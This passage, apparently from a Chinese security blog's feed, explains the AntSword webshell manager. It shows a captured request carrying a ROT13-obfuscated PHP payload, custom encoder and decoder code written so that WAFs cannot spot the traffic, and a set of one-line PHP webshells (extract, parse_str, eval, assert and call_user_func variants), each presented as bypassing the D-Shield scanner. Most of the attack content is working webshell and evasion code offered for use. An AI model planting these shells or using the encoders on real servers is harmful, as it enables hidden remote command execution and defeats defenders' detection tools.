class="number">.1</span>:<span class="number">8888</span></span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">User-Agent: antSword/v2<span class="number">.1</span></span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: <span class="number">992</span></span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">cmd=%<span class="number">40</span>vav_frg(%<span class="number">22</span>qvfcynl_reebef%<span class="number">22</span>%<span class="number">2</span>C%<span class="number">20</span>%<span class="number">220</span>%<span class="number">22</span>)%<span class="number">3</span>B%<span class="number">40</span>frg_gvzr_yvzvg(<span class="number">0</span>)%<span class="number">3</span>Bshapgvba%<span class="number">20</span>nfrap(%<span class="number">24</span>bhg)%<span class="number">7</span>Berghea%<span class="number">20</span>%<span class="number">24</span>bhg%<span class="number">3</span>B%<span class="number">7</span>D%<span class="number">3</span>Bshapgvba%<span class="number">20</span>nfbhgchg()%<span class="number">7</span>B%<span class="number">24</span>bhgchg%<span class="number">3</span>Dbo_trg_pbagragf()%<span class="number">3</span>Bbo_raq_pyrna()%<span class="number">3</span>Brpub%<span class="number">20</span>%<span class="number">2267</span>p814%<span class="number">22</span>%<span class="number">3</span>Brpub%<span class="number">20</span>%<span class="number">40</span>nfrap(%<span class="number">24</span>bhgchg)%<span class="number">3</span>Brpub%<span class="number">20</span>%<span class="number">22132</span>nr0pso07%<span class="number">22</span>%<span class="number">3</span>B%<span class="number">7</span>Dbo_fgneg()%<span class="number">3</span>Bgel%<span class="number">7</span>B%<span class="number">24</span>Q%<span class="number">3</span>Dqveanzr(%<span class="number">24</span>_FREIRE%<span class="number">5</span>B%<span class="number">22</span>FPEVCG_SVYRANZR%<span class="number">22</span>%<span class="number">5</span>D)%<span class="number">3</span>Bvs(%<span class="number">24</span>Q%<span class="number">3</span>D%<span class="number">3</span>D%<span class="number">22</span>%<span class="number">22</span>)%<span class="number">24</span>Q%<span class="number">3</span>Dqveanzr(%<span class="number">24</span>_FREIRE%<span class="number">5</span>B%<span class="number">22</span>CNGU_GENAFYNGRQ%<span class="number">22</span>%<span class="number">5</span>D)%<span class="number">3</span>B%<span class="number">24</span>E%<span class="number">3</span>D%<span class="number">22</span>%<span class="number">7</span>B%<span class="number">24</span>Q%<span class="number">7</span>D%<span class="number">09</span>%<span class="number">22</span>%<span class="number">3</span>Bvs(fhofge(%<span class="number">24</span>Q%<span class="number">2</span>C0%<span class="number">2</span>C1)!%<span class="number">3</span>D%<span class="number">22</span>%<span class="number">2</span>F%<span class="number">22</span>)%<span class="number">7</span>Bsbernpu(enatr(%<span class="number">22</span>P%<span class="number">22</span>%<span class="number">2</span>C%<span class="number">22</span>M%<span class="number">22</span>)nf%<span class="number">20</span>%<span class="number">24</span>Y)vs(vf_qve(%<span class="number">22</span>%<span class="number">7</span>B%<span class="number">24</span>Y%<span class="number">7</span>D%<span class="number">3</span>A%<span class="number">22</span>))%<span class="number">24</span>E.%<span class="number">3</span>D%<span class="number">22</span>%<span class="number">7</span>B%<span class="number">24</span>Y%<span class="number">7</span>D%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">3</span>B%<span class="number">7</span>Dryfr%<span class="number">7</span>B%<span class="number">24</span>E.%<span class="number">3</span>D%<span class="number">22</span>%<span class="number">2</span>F%<span class="number">22</span>%<span class="number">3</span>B%<span class="number">7</span>D%<span class="number">24</span>E.%<span class="number">3</span>D%<span class="number">22</span>%<span class="number">09</span>%<span class="number">22</span>%<span class="number">3</span>B%<span class="number">24</span>h%<span class="number">3</span>D(shapgvba_rkvfgf(%<span class="number">22</span>cbfvk_trgrtvq%<span class="number">22</span>))%<span class="number">3</span>F%<span class="number">40</span>cbfvk_trgcjhvq(%<span class="number">40</span>cbfvk_trgrhvq())%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">22</span>%<span class="number">3</span>B%<span class="number">24</span>f%<span class="number">3</span>D(%<span class="number">24</span>h)%<span class="number">3</span>F%<span class="number">24</span>h%<span class="number">5</span>B%<span class="number">22</span>anzr%<span class="number">22</span>%<span class="number">5</span>D%<span class="number">3</span>A%<span class="number">40</span>trg_pheerag_hfre()%<span class="number">3</span>B%<span class="number">24</span>E.%<span class="number">3</span>Dcuc_hanzr()%<span class="number">3</span>B%<span class="number">24</span>E.%<span class="number">3</span>D%<span class="number">22</span>%<span class="number">09</span>%<span class="number">7</span>B%<span class="number">24</span>f%<span class="number">7</span>D%<span class="number">22</span>%<span class="number">3</span>Brpub%<span class="number">20</span>%<span class="number">24</span>E%<span class="number">3</span>B%<span class="number">3</span>B%<span class="number">7</span>Dpngpu(Rkprcgvba%<span class="number">20</span>%<span class="number">24</span>r)%<span class="number">7</span>Brpub%<span class="number">20</span>%<span class="number">22</span>REEBE%<span class="number">3</span>A%<span class="number">2</span>F%<span class="number">2</span>F%<span class="number">22.</span>%<span class="number">24</span>r-%<span class="number">3</span>EtrgZrffntr()%<span class="number">3</span>B%<span class="number">7</span>D%<span class="number">3</span>Bnfbhgchg()%<span class="number">3</span>Bqvr()%<span class="number">3</span>B</span><br></pre></td></tr></table></figure><p>任何你能想到的字符串变换的方式，你都可以自由使用，互相随意组合，打造一款属于你自己的无特征的编码器。</p><h3 id="编码器限制"><a href="#编码器限制" class="headerlink" title="编码器限制"></a>编码器限制</h3><p>由于蚁剑只会对<code>data[pwd]</code>里面的参数按照设定的编码器编码，其它参数默认使用base64编码，所以其它参数一旦被waf解码还是会有明显的特征，从而导致被拦截。</p><p>解决办法是遍历<code>data[_]</code>取出其中的值并将其全部编码。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;**</span><br><span class="line"> * php::base64编码器</span><br><span class="line"> * Create at: 2020&#x2F;05&#x2F;21 13:07:23</span><br><span class="line"> *&#x2F;</span><br><span class="line">&#39;use strict&#39;;</span><br><span class="line"></span><br><span class="line">&#x2F;*</span><br><span class="line">* @param  &#123;String&#125; pwd   连接密码</span><br><span class="line">* @param  &#123;Array&#125;  data  编码器处理前的 payload 数组</span><br><span class="line">* @return &#123;Array&#125;  data  编码器处理后的 payload 数组</span><br><span class="line">*&#x2F;</span><br><span class="line">module.exports &#x3D; (pwd, data) &#x3D;&gt; &#123;</span><br><span class="line">   ##########    请在下方编写你自己的代码   ###################</span><br><span class="line">  for (let _ in data)&#123;</span><br><span class="line">    if (_ &#x3D;&#x3D;&#x3D; &#39;_&#39;) &#123; continue &#125;;</span><br><span class="line">    ret[_] &#x3D; Buffer.from(data[_]).toString(&#39;base64&#39;);</span><br><span class="line">    ret[_] &#x3D; &#39;steady&#39; + ret[_];</span><br><span class="line">    ret[_] +&#x3D; &#39;steady&#39;;</span><br><span class="line">    &#125;</span><br><span class="line">  ret[pwd] &#x3D; Buffer.from(data[&#39;_&#39;]).toString(&#39;base64&#39;);</span><br><span class="line">    ret[pwd] &#x3D; &#39;steady&#39; + ret[pwd];</span><br><span class="line">    ret[pwd] +&#x3D; &#39;steady&#39;;</span><br><span class="line">    &#x2F;&#x2F; 返回编码器处理后的 payload 数组</span><br><span class="line">    return ret;</span><br><span class="line">    ##########    请在下方编写你自己的代码   ###################</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到并没有对其他参数进行编码，而是向其他参数加入了一下自定义的字符串。</p><h2 id="解码器"><a href="#解码器" class="headerlink" title="解码器"></a>解码器</h2><p>蚁剑的编码器是编码或者加密蚁剑向服务端发送的请求包的，所以解码器是用来编码或者加密服务端返回给蚁剑的数据包的，编码后的数据包只有蚁剑能够解码。有些waf会检测返回包，所以有时也需要使用解码器。</p><p>使用编码器</p><p>使用base64，返回的数据被加密成base64。</p><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/image-20201011192041042.png" alt="image-20201011192041042"></p><p>不使用编码器</p><p>可以看到返回包是明文。</p><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/image-20201011191731747.png" alt="image-20201011191731747"></p><h3 id="解码器分析"><a href="#解码器分析" class="headerlink" title="解码器分析"></a>解码器分析</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line"> * php::base64解码器</span><br><span class="line"> * Create at: <span class="number">2020</span>/<span class="number">05</span>/<span class="number">22</span> <span class="number">10</span>:<span class="number">21</span>:<span class="number">48</span></span><br><span class="line"> */</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;use strict&#x27;</span>;</span><br><span class="line"></span><br><span class="line">module.exports = &#123;</span><br><span class="line">  /**</span><br><span class="line">   * @returns &#123;string&#125; asenc 将返回数据base64编码</span><br><span class="line">   * 自定义输出函数名称必须为 asenc</span><br><span class="line">   * 该函数使用的语法需要和shell保持一致</span><br><span class="line">   */</span><br><span class="line">  asoutput: () =&gt; &#123;</span><br><span class="line">    <span class="keyword">return</span> `function asenc($out)&#123;</span><br><span class="line">      <span class="keyword">return</span> @base64_encode($out);</span><br><span class="line">    &#125;</span><br><span class="line">    `.replace(/\n\s+/g, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">  &#125;,</span><br><span class="line">  /**</span><br><span class="line">   * 解码 Buffer</span><br><span class="line">   * @param &#123;string&#125; data 要被解码的 Buffer</span><br><span class="line">   * @returns &#123;string&#125; 解码后的 Buffer</span><br><span class="line">   */</span><br><span class="line">  decode_buff: (data, ext=&#123;&#125;) =&gt; &#123;</span><br><span class="line">    <span class="keyword">return</span> Buffer.<span class="keyword">from</span>(data.toString(), <span class="string">&#x27;base64&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>两个方法，<code>asoutput</code>及<code>decode_buff</code>。</p><p><code>asoutput</code>无需传入参数，返回一段php代码字符串，名称为<code>asenc</code>的函数，这个函数会放在请求包里，用于在服务端执行完代码后，再回显部分调用该函数asenc来编码处理，所以服务端无需针对解码做改动。</p><h3 id="自制编码器"><a href="#自制编码器" class="headerlink" title="自制编码器"></a>自制编码器</h3><p>主要原理就是在返回的数据包中加入自己的随机字符。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">asoutput: () &#x3D;&gt; &#123;</span><br><span class="line">  return &#96;function asenc($out)&#123;</span><br><span class="line">    &#x2F;&#x2F;返回时添加一个随机字符串，避免被waf解码成功</span><br><span class="line">    return &#39;steady&#39;.@base64_encode($out);</span><br><span class="line">  &#125;</span><br><span class="line">  &#96;.replace(&#x2F;\n\s+&#x2F;g, &#39;&#39;);</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><h2 id="对称加密，非对称加密"><a href="#对称加密，非对称加密" class="headerlink" title="对称加密，非对称加密"></a>对称加密，非对称加密</h2><h1 id="客户端免杀"><a href="#客户端免杀" class="headerlink" title="客户端免杀"></a>客户端免杀</h1><h2 id="extract-变量覆盖过D盾"><a href="#extract-变量覆盖过D盾" class="headerlink" title="extract 变量覆盖过D盾"></a>extract 变量覆盖过D盾</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  $a&#x3D;1;$b&#x3D;$_POST;extract($b);print_r(&#96;$a&#96;)?&gt;</span><br></pre></td></tr></table></figure><p>post数据a=命令</p><h2 id="parse-str-变量覆盖过D盾"><a href="#parse-str-变量覆盖过D盾" class="headerlink" title="parse_str 变量覆盖过D盾"></a>parse_str 变量覆盖过D盾</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  $a&#x3D;1;$b&#x3D;&quot;a&#x3D;&quot;.$_GET[&#39;a&#39;];parse_str($b);print_r(&#96;$a&#96;)?&gt;</span><br></pre></td></tr></table></figure><p>get数据a=命令</p><h2 id="destruct-析构函数过D盾"><a href="#destruct-析构函数过D盾" class="headerlink" title="__destruct 析构函数过D盾"></a>__destruct 析构函数过D盾</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"></span><br><span class="line">class User</span><br><span class="line">&#123;</span><br><span class="line">  public $name &#x3D; &#39;&#39;;</span><br><span class="line"></span><br><span class="line">  function __destruct()&#123;</span><br><span class="line">    eval(&quot;$this-&gt;name&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$user &#x3D; new User;</span><br><span class="line">$user-&gt;name &#x3D; &#39;&#39;.$_POST[&#39;name&#39;];</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h2 id="null-拼接过D盾"><a href="#null-拼接过D盾" class="headerlink" title="null 拼接过D盾"></a>null 拼接过D盾</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$name &#x3D; $_GET[&#39;name&#39;];</span><br><span class="line"></span><br><span class="line">$name1&#x3D;$name2&#x3D; null;</span><br><span class="line"></span><br><span class="line">eval($name1.$name2.$name);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h2 id="‘’-拼接过D盾"><a href="#‘’-拼接过D盾" class="headerlink" title="‘’ 拼接过D盾"></a>‘’ 拼接过D盾</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$name &#x3D; $_GET[&#39;name&#39;];</span><br><span class="line"></span><br><span class="line">$name1&#x3D;$name2&#x3D; &#39;&#39;;</span><br><span class="line"></span><br><span class="line">eval($name1.$name2.$name);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h2 id="‘’-null-拼接过D盾"><a href="#‘’-null-拼接过D盾" class="headerlink" title="‘’ null 拼接过D盾"></a>‘’ null 拼接过D盾</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a &#x3D; $_GET[&#39;a&#39;];</span><br><span class="line">$c &#x3D; null;</span><br><span class="line">eval(&#39;&#39;.$c.$a);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h2 id="array-map函数过D盾"><a href="#array-map函数过D盾" class="headerlink" title="array_map函数过D盾"></a>array_map函数过D盾</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function user()</span><br><span class="line">&#123;</span><br><span class="line">$a123 &#x3D;  chr(97).chr(115).chr(115).chr(101).chr(114).chr(116);</span><br><span class="line">return &#39;&#39;.$a123;</span><br><span class="line">&#125;</span><br><span class="line">$a123 &#x3D; user();</span><br><span class="line">$x123 &#x3D;array($_GET[&#39;x&#39;]);</span><br><span class="line">array_map($a123,$a123 &#x3D; $x123 );</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h2 id="call-user-func-array函数过D盾"><a href="#call-user-func-array函数过D盾" class="headerlink" title="call_user_func_array函数过D盾"></a>call_user_func_array函数过D盾</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">function a()&#123;</span><br><span class="line">     return &#39;assert&#39;;</span><br><span class="line">&#125;</span><br><span class="line">$a&#x3D;a();</span><br><span class="line">$aa &#x3D; array($_GET[&#39;x&#39;]);</span><br><span class="line">call_user_func_array($a,$a&#x3D;$aa);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h2 id="call-user-func函数过D盾"><a href="#call-user-func函数过D盾" class="headerlink" title="call_user_func函数过D盾"></a>call_user_func函数过D盾</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function a()&#123;</span><br><span class="line">     return &#39;assert&#39;;</span><br><span class="line">&#125;</span><br><span class="line">$a&#x3D;a();</span><br><span class="line">$aa&#x3D;$_GET[&#39;x&#39;];</span><br><span class="line">call_user_func($a,$a&#x3D;$aa);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;蚁剑的工作原理&quot;&gt;&lt;a href=&quot;#蚁剑的工作原理&quot; class=&quot;headerlink&quot; title=&quot;蚁剑的工作原理&quot;&gt;&lt;/a&gt;蚁剑的工作原理&lt;/h1&gt;&lt;h2 id=&quot;连接shell&quot;&gt;&lt;a href=&quot;#连接shell&quot; class=&quot;headerlink</summary>
      
    
    
    
    <category term="渗透工具学习" scheme="http://s1eady.top/categories/%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7%E5%AD%A6%E4%B9%A0/"/>
    
    
    <category term="渗透工具学习" scheme="http://s1eady.top/tags/%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7%E5%AD%A6%E4%B9%A0/"/>
    
  </entry>
  
</feed>
